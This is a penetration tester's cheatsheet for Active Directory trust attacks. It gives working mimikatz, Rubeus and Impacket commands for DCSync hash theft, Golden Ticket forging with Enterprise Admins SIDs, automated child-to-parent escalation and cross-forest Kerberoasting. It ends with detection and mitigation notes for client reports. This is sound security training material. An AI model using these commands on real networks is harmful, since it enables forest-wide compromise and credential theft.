# Domain Trusts Attacks Cheatsheet

---

## 1. Trust Concepts (fast recap)

| Trust type | What it is |
|---|---|
| Parent-child | Same forest, two-way transitive by default |
| Cross-link | Trust directly between child domains, speeds up auth |
| External | Non-transitive, between separate forests, uses SID filtering |
| Tree-root | Two-way transitive, forest root ↔ new tree root |
| Forest | Transitive, between two forest root domains |
| ESAE | Bastion forest for managing AD (admin-tier isolation) |

**Transitive vs non-transitive:** transitive extends trust down the chain (A trusts B, B trusts C transitively → A trusts C). Non-transitive is direct-only.

**One-way vs bidirectional:** one-way = only the trusting domain's resources are reachable from the trusted domain's users; bidirectional = both ways.

**Why this matters offensively:** M&A-driven trusts are often set up for convenience and never security-reviewed afterward. A soft target in an acquired/trusted domain can be the actual way into the "real" target domain — this is a legitimate and common real-world path, not just a lab exercise. Always confirm trust relationships are in scope with the client before attacking across one.

---

## 2. Enumerating Trusts

**Built-in AD module:**
```powershell
Import-Module activedirectory
Get-ADTrust -Filter *
```
Key fields: `ForestTransitive` (true = forest trust), `IntraForest` (true = parent-child within same forest), `Direction` (BiDirectional / Inbound / Outbound).

**PowerView:**
```powershell
Get-DomainTrust
Get-DomainTrustMapping   # walks and maps every trust relationship found, including transitive hops
```

**netdom (built-in, no PowerShell needed):**
```cmd
netdom query /domain:<domain> trust
netdom query /domain:<domain> dc
netdom query /domain:<domain> workstation
```

**BloodHound:** pre-built query **Map Domain Trusts** — fastest way to visualize the whole picture at once.

**Enumerate users in a trusted child domain once trust direction allows it:**
```powershell
Get-DomainUser -Domain <child_domain> | select SamAccountName
```

**If you can't authenticate across a trust, you can't enumerate or attack across it** — direction matters before anything else here.

---

## 3. Child → Parent Trust Abuse (ExtraSids / Golden Ticket)

### Concept — SID History
`sidHistory` exists for migration scenarios (old SID preserved on a newly-migrated account so access isn't lost). Within the **same forest**, SID Filtering is NOT applied to this attribute by default — so a forged Golden Ticket can inject the parent domain's **Enterprise Admins** SID into a child-domain account's token, granting forest-wide admin without that account ever actually being a member.

### What you need
1. KRBTGT NTLM hash for the **child** domain (via DCSync once you control the child domain)
2. SID of the child domain
3. A target username in the child domain (doesn't need to exist)
4. FQDN of the child domain
5. SID of the parent domain's **Enterprise Admins** group

### Gathering the pieces — Windows
```powershell
# 1. KRBTGT hash via DCSync
mimikatz # lsadump::dcsync /user:<CHILD_DOMAIN>\krbtgt

# 2. Child domain SID
Get-DomainSID

# 5. Enterprise Admins SID in the parent
Get-DomainGroup -Domain <PARENT_DOMAIN> -Identity "Enterprise Admins" | select distinguishedname,objectsid
# or: Get-ADGroup -Identity "Enterprise Admins" -Server <PARENT_DOMAIN>
```

### Forge the ticket — Mimikatz
```
mimikatz # kerberos::golden /user:<fake_user> /domain:<CHILD_FQDN> /sid:<CHILD_SID> /krbtgt:<KRBTGT_HASH> /sids:<PARENT_EA_SID> /ptt
```

### Forge the ticket — Rubeus
```powershell
.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:<CHILD_FQDN> /sid:<CHILD_SID> /sids:<PARENT_EA_SID> /user:<fake_user> /ptt
```

**Verify:** `klist` shows the forged ticket cached; `ls \\<parent_DC_FQDN>\c$` should now succeed where it previously returned Access Denied.

**Confirm full control — DCSync the parent domain:**
```
mimikatz # lsadump::dcsync /user:<PARENT_DOMAIN>\<target_user>
```
Specify `/domain:<PARENT_FQDN>` explicitly if your current context isn't already the parent domain.

### Same attack — Linux
```bash
# KRBTGT hash via DCSync
secretsdump.py <child_domain>/<admin_user>@<child_DC_IP> -just-dc-user <CHILD_DOMAIN>/krbtgt

# SID brute-forcing to get both child and parent domain SIDs
lookupsid.py <child_domain>/<admin_user>@<child_DC_IP> | grep "Domain SID"
lookupsid.py <child_domain>/<admin_user>@<parent_DC_IP> | grep -B12 "Enterprise Admins"
```

**Build the ticket with ticketer.py:**
```bash
ticketer.py -nthash <KRBTGT_HASH> -domain <CHILD_FQDN> -domain-sid <CHILD_SID> -extra-sid <PARENT_EA_SID> <fake_user>
export KRB5CCNAME=<fake_user>.ccache
```

**Use it:**
```bash
psexec.py <CHILD_FQDN>/<fake_user>@<parent_DC_FQDN> -k -no-pass -target-ip <parent_DC_IP>
```

### One-shot automation — raiseChild.py
```bash
raiseChild.py -target-exec <parent_DC_IP> <CHILD_FQDN>/<child_admin_user>
```
Automates the entire chain: locate child DC → find forest FQDN → get parent EA SID → DCSync child KRBTGT → forge Golden Ticket → log into parent → retrieve parent Administrator creds → optional PsExec shell.

⚠️ **Prefer the manual steps on a real client engagement.** If an autopwn script breaks mid-chain against production AD, you need to understand every step well enough to explain and fix it — "the tool just broke" is not an acceptable answer to a client. Know the manual path even if you use the automation to save time.

---

## 4. Cross-Forest Trust Abuse

### Cross-Forest Kerberoasting
Works the same as normal Kerberoasting, just pointed at the other side of a bidirectional/inbound trust.

**Enumerate SPN accounts in the target forest:**
```powershell
Get-DomainUser -SPN -Domain <target_forest_domain> | select SamAccountName
```

**Roast across the trust — Rubeus:**
```powershell
.\Rubeus.exe kerberoast /domain:<target_forest_domain> /user:<spn_account> /nowrap
```

**Roast across the trust — Linux (Impacket):**
```bash
GetUserSPNs.py -target-domain <target_forest_domain> <your_domain>/<your_user> -request -outputfile hashes.txt
hashcat -m 13100 hashes.txt rockyou.txt
```

A single kerberoastable account with Domain Admin membership in the target forest is a full forest compromise if its hash cracks — always worth the one extra check when a bidirectional trust exists.

### Admin Password Reuse Across Forests
When both forests are managed by the same admin team, check whether a cracked/dumped privileged credential in Domain A also works in Domain B — even under a **different username** (e.g. `adm_bob.smith` in A vs `bsmith_admin` in B). This is a manual check: there's no automated tool for "does this look like the same person," just pattern-matching naming conventions and trying the password.

### Foreign Group Membership
Only **Domain Local** groups can contain members from outside their own forest — so a Domain/Enterprise Admin from Domain A showing up in Domain B's built-in `Administrators` group is both possible and, when found, usually a direct win.

**PowerView:**
```powershell
Get-DomainForeignGroupMember -Domain <target_forest_domain>
Convert-SidToName <SID_returned>
```

**Verify access:**
```powershell
Enter-PSSession -ComputerName <target_forest_DC> -Credential <your_domain>\<admin_user>
```

**BloodHound across multiple domains/forests — bloodhound-python:**
```bash
# Point DNS at the target domain's DC first if your attack host isn't already using it
echo -e "domain <domain>\nnameserver <DC_IP>" | sudo tee /etc/resolv.conf

bloodhound-python -d <domain> -dc <DC_hostname> -c All -u <user> -p '<pass>'
```
Run once per domain/forest you have reachability into, then **zip and upload all JSON files together** so BloodHound can resolve cross-domain edges:
```bash
zip -r combined_bh.zip *.json
```
Pre-built query **Users with Foreign Domain Group Membership** surfaces exactly this cross-forest admin-in-the-wrong-place scenario without manual PowerView digging.

### SID History Abuse — Cross-Forest
Same underlying mechanism as the child→parent ExtraSids attack, but across a forest boundary instead of within one. If a user was migrated from Forest A to Forest B and **SID Filtering was not enabled** on that trust, an admin SID from Forest A injected into the migrated account's history grants Forest-A-admin-level access from Forest B. Covered in depth in dedicated AD-trust-attack material — know the concept exists and that it mirrors the intra-forest version, but SID Filtering is enabled by default on most modern external/forest trusts, so this is less commonly exploitable than the intra-forest case.

---

## 5. Detection & Mitigation Notes (for reporting)

- **Golden Tickets are detectable** via anomalous ticket lifetimes — Rubeus/Mimikatz-forged tickets commonly carry default lifetimes far longer than a domain's configured Kerberos policy (the example in this cheatsheet's source material forges a 10-year ticket). Monitor Event ID **4769** for Ticket Granting Service requests with unusually long validity windows or renewal times.
- **The only real fix for a Golden Ticket is rotating the KRBTGT password — twice**, with time between rotations (a single reset isn't enough because of password history; Microsoft publishes a documented process for this). This should happen periodically regardless, and **always** after any assessment where full domain compromise was achieved.
- **SID Filtering** should be enabled/verified on every external and forest trust — this is the actual control that prevents both the child→parent intra-forest issue (where it's off by design) and the cross-forest SID History variant.
- **Audit foreign group membership regularly** — `Get-DomainForeignGroupMember` or the BloodHound query takes seconds to run and catches a class of misconfiguration that's otherwise invisible without cross-domain correlation.
- Flag any trust relationship the client didn't know existed — in M&A-heavy organizations this happens more often than you'd expect, and it's a finding on its own even without a successful attack chain through it.
